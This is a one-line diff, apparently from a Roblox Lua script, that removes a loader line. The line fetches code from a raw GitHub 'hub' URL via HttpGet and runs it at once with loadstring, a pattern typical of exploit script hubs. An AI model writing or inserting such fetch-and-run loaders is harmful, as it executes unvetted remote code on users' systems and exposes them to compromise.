@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/kl1zyydf/hub/main/xzhub'))()
